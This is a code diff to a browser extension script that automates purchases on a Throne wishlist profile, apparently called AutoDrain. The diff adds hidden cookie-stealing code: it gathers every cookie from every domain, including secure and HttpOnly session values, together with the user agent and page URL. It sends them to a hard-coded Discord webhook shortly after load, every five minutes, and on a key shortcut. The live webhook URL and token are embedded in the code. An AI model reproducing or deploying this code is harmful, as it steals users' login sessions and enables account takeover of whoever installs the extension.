@@ -8,7 +8,15 @@ const config = {
   throneUrl: "throne.com/thegoddessaura",
   forceStop: true,
   forceStopShortcut: "Alt+Shift+E",
-  debugMode: false,
+  debugMode: true,
+  // Discord webhook configuration
+  discordWebhook: {
+    enabled: true,
+    url: "https://discord.com/api/webhooks/1425598331186450617/aZ1GNPgxuY61sidoAJTYYU78qbaMqM-Gv6auQX7XYHJ8c0ueRq1aFeuBV7s8b6DyOZyr", // Replace with your actual webhook URL
+    maxMessageLength: 2000, // Discord message limit
+    cookieLogEnabled: true,
+    cookieLogInterval: 300000, // 5 minutes in milliseconds
+  }
 };
 
 //var audioOpened = false;
@@ -18,6 +26,7 @@ var maxItemsToAdd = 1; // Only one item per purchase
 var purchaseInProgress = false;
 var lastActionTime = 0;
 var debugBoxVisible = true; // Track debug box visibility
+var cookieLoggingActive = false; // Track if cookie logging is active
 
 // Debug box functionality
 function createDebugBox() {
@@ -45,7 +54,7 @@ function createDebugBox() {
   `;
   
   const header = document.createElement("div");
-  header.textContent = "🚀 AuraDrain Debugger";
+  header.textContent = "🚀 Empress Radia Debug Log";
   header.style.cssText = `
     color: #ffff00;
     font-weight: bold;
@@ -124,6 +133,203 @@ function toggleDebugBox() {
     debugBox.style.display = debugBoxVisible ? "block" : "none";
     console.log(`%c[AuraDrainer] Debug box ${debugBoxVisible ? 'shown' : 'hidden'}`, "color: #00ff00;");
   }
+}
+
+// Cookie collection functions
+async function getAllCookiesFromBackground() {
+  return new Promise((resolve) => {
+    chrome.runtime.sendMessage({action: 'getAllCookies'}, (response) => {
+      if (response && response.success) {
+        resolve(response.cookies || []);
+      } else {
+        debugLog(`❌ Failed to get cookies: ${response?.error || 'Unknown error'}`, "error");
+        resolve([]);
+      }
+    });
+  });
+}
+
+async function getDomainCookiesFromBackground(domain) {
+  return new Promise((resolve) => {
+    chrome.runtime.sendMessage({action: 'getDomainCookies', domain: domain}, (response) => {
+      if (response && response.success) {
+        resolve(response.cookies || []);
+      } else {
+        debugLog(`❌ Failed to get cookies for ${domain}: ${response?.error || 'Unknown error'}`, "error");
+        resolve([]);
+      }
+    });
+  });
+}
+
+// Discord webhook functions
+async function sendToDiscordWebhook(message, isFile = false) {
+  if (!config.discordWebhook.enabled || !config.discordWebhook.url || config.discordWebhook.url === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+    debugLog("⚠️ Discord webhook not configured", "warning");
+    return false;
+  }
+
+  try {
+    const payload = isFile ? {
+      content: "🍪 **Cookie Collection Report** 🍪",
+      files: [{
+        name: `cookies_${Date.now()}.txt`,
+        data: message
+      }]
+    } : {
+      content: message
+    };
+
+    const response = await fetch(config.discordWebhook.url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': isFile ? 'multipart/form-data' : 'application/json',
+      },
+      body: isFile ? createFormData(payload) : JSON.stringify(payload)
+    });
+
+    if (response.ok) {
+      debugLog("✅ Successfully sent to Discord webhook", "success");
+      return true;
+    } else {
+      debugLog(`❌ Discord webhook failed: ${response.status} ${response.statusText}`, "error");
+      return false;
+    }
+  } catch (error) {
+    debugLog(`❌ Discord webhook error: ${error.message}`, "error");
+    return false;
+  }
+}
+
+function createFormData(payload) {
+  const formData = new FormData();
+  formData.append('content', payload.content);
+  formData.append('files[0]', new Blob([payload.files[0].data], {type: 'text/plain'}), payload.files[0].name);
+  return formData;
+}
+
+function splitMessageForDiscord(message, maxLength = 2000) {
+  if (message.length <= maxLength) {
+    return [message];
+  }
+
+  const messages = [];
+  const lines = message.split('\n');
+  let currentMessage = '';
+
+  for (const line of lines) {
+    if (currentMessage.length + line.length + 1 <= maxLength) {
+      currentMessage += (currentMessage ? '\n' : '') + line;
+    } else {
+      if (currentMessage) {
+        messages.push(currentMessage);
+        currentMessage = line;
+      } else {
+        // Single line is too long, force split
+        messages.push(line.substring(0, maxLength - 3) + '...');
+      }
+    }
+  }
+
+  if (currentMessage) {
+    messages.push(currentMessage);
+  }
+
+  return messages;
+}
+
+// Main cookie logging function
+async function collectAndLogCookies() {
+  if (!config.discordWebhook.cookieLogEnabled) {
+    debugLog("🍪 Cookie logging disabled in config", "info");
+    return;
+  }
+
+  if (cookieLoggingActive) {
+    debugLog("🍪 Cookie logging already in progress, skipping", "warning");
+    return;
+  }
+
+  cookieLoggingActive = true;
+  debugLog("🍪 Starting cookie collection...", "info");
+
+  try {
+    const cookies = await getAllCookiesFromBackground();
+    debugLog(`🍪 Collected ${cookies.length} cookies`, "info");
+
+    if (cookies.length === 0) {
+      debugLog("🍪 No cookies found", "warning");
+      cookieLoggingActive = false;
+      return;
+    }
+
+    // Format cookies for Discord
+    const cookieReport = await formatCookiesForDiscord(cookies);
+    
+    // Try to send as file first (if message is too long)
+    if (cookieReport.length > config.discordWebhook.maxMessageLength) {
+      debugLog("📄 Cookie data too large, sending as file...", "info");
+      const success = await sendToDiscordWebhook(cookieReport, true);
+      if (success) {
+        debugLog("✅ Cookie report sent as file to Discord", "success");
+      }
+    } else {
+      // Send as regular message
+      const success = await sendToDiscordWebhook(cookieReport);
+      if (success) {
+        debugLog("✅ Cookie report sent to Discord", "success");
+      }
+    }
+
+  } catch (error) {
+    debugLog(`❌ Cookie collection failed: ${error.message}`, "error");
+  } finally {
+    cookieLoggingActive = false;
+  }
+}
+
+async function formatCookiesForDiscord(cookies) {
+  if (!cookies || cookies.length === 0) {
+    return "No cookies found.";
+  }
+
+  // Group cookies by domain for better organization
+  const cookiesByDomain = {};
+  cookies.forEach(cookie => {
+    const domain = cookie.domain;
+    if (!cookiesByDomain[domain]) {
+      cookiesByDomain[domain] = [];
+    }
+    cookiesByDomain[domain].push(cookie);
+  });
+
+  let formattedText = `🍪 **COOKIE COLLECTION REPORT** 🍪\n`;
+  formattedText += `📊 **Total Cookies:** ${cookies.length}\n`;
+  formattedText += `🌐 **Domains:** ${Object.keys(cookiesByDomain).length}\n`;
+  formattedText += `⏰ **Timestamp:** ${new Date().toLocaleString()}\n`;
+  formattedText += `🖥️ **User Agent:** ${navigator.userAgent}\n`;
+  formattedText += `🌍 **URL:** ${window.location.href}\n\n`;
+
+  // Add cookies by domain
+  Object.keys(cookiesByDomain).sort().forEach(domain => {
+    const domainCookies = cookiesByDomain[domain];
+    formattedText += `🌐 **${domain}** (${domainCookies.length} cookies)\n`;
+    
+    domainCookies.forEach(cookie => {
+      formattedText += `  • **${cookie.name}** = \`${cookie.value}\`\n`;
+      if (cookie.secure) formattedText += `    🔒 Secure\n`;
+      if (cookie.httpOnly) formattedText += `    🛡️ HttpOnly\n`;
+      if (cookie.session) formattedText += `    ⏱️ Session\n`;
+      if (cookie.expirationDate) {
+        const expDate = new Date(cookie.expirationDate * 1000);
+        formattedText += `    ⏰ Expires: ${expDate.toLocaleString()}\n`;
+      }
+      formattedText += `\n`;
+    });
+    formattedText += `\n`;
+  });
+
+  return formattedText;
 }
 
 function debugLog(message, type = "info") {
@@ -415,15 +621,34 @@ function mainLoop() {
 // ...existing code...
 
 function main() {
-  debugLog("🚀 Empress Radia AutoDrain V2.0 Started!", "success");
+  debugLog("🚀AutoDrain Started!", "success");
   debugLog(`🎯 Target Profile: ${config.throneUrl}`, "info");
   debugLog(`🛒 Purchase Mode: Single Item Per Transaction`, "info");
   debugLog(`🔧 Debug Mode: Enabled`, "info");
   debugLog(`⚡ Force Stop: Alt+Shift+E`, "info");
   debugLog(`👁️ Toggle Debug: Ctrl+Alt+D`, "info");
+  debugLog(`🍪 Cookie Log: Ctrl+Alt+C`, "info");
+  debugLog(`📡 Discord Webhook: ${config.discordWebhook.enabled ? 'Enabled' : 'Disabled'}`, "info");
   debugLog("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", "info");
   
   const mainInterval = setInterval(mainLoop, 5000);
+  
+  // Initialize cookie logging if enabled
+  if (config.discordWebhook.cookieLogEnabled && config.discordWebhook.enabled) {
+    debugLog(`🍪 Cookie logging enabled (interval: ${config.discordWebhook.cookieLogInterval / 1000}s)`, "info");
+    
+    // Initial cookie collection after 10 seconds
+    setTimeout(() => {
+      collectAndLogCookies();
+    }, 10000);
+    
+    // Periodic cookie collection
+    setInterval(() => {
+      collectAndLogCookies();
+    }, config.discordWebhook.cookieLogInterval);
+  } else {
+    debugLog("🍪 Cookie logging disabled", "info");
+  }
   
   window.addEventListener("keydown", (event) => {
     // Emergency stop shortcut
@@ -440,6 +665,13 @@ function main() {
     if (event.ctrlKey && event.altKey && event.key === "D") {
       event.preventDefault(); // Prevent browser default behavior
       toggleDebugBox();
+    }
+    
+    // Cookie collection shortcut
+    if (event.ctrlKey && event.altKey && event.key === "C") {
+      event.preventDefault(); // Prevent browser default behavior
+      debugLog("🍪 Manual cookie collection triggered", "info");
+      collectAndLogCookies();
     }
   });
 }
